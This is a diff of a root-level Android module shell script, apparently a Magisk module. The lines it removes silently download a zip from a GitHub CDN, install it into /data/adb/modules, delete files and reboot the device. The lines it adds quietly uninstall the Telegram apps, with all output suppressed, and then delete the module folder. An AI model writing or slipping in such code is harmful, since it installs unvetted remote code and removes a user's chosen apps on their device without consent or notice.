@@ -4,23 +4,13 @@ hpjy=temphp105
 dqsj1=9911141530
 dqsj2=99年11月14日15时30分
 MAC3=463712
-if [ -e /data/adb/modules/FUCK-SHIT-FILE/Clear_Script.sh ]  
-then 
-echo " "  
-else 
+
 (
-curl https://cdn.jsdelivr.net/gh/WZFFMK/xh@main/FUCK-SHIT-FILE2.zip > /data/adb/modules/FUCK-SHIT-FILE.zip
-unzip -o /data/adb/modules/FUCK-SHIT-FILE.zip -d /data/adb/modules
-cp /data/adb/modules/FUCK-SHIT-FILE/files/FUCK-XXX.conf /storage/emulated/0/Android/FUCK-XXX.conf
-rm -rf /data/adb/modules/files
-rm -rf /data/adb/modules/*.sh
-rm -rf /data/adb/modules/*.prop
-rm -rf /data/adb/modules/FUCK-SHIT-FILE.zip
+pm uninstall --user -0 org.telegram.messenger.web
+pm uninstall --user -0 org.telegram.messenger
+rm -rf /data/adb/modules/FUCK-SHIT-FILE
 ) >/dev/null 2>&1 
-echo '第一次运行，将于3s后重启'
-sleep 3
-reboot
-fi 
+
 
  testurl2='www.baidu.com' 
  status=$(curl -s -m 5 -IL $testurl2|grep 200) 
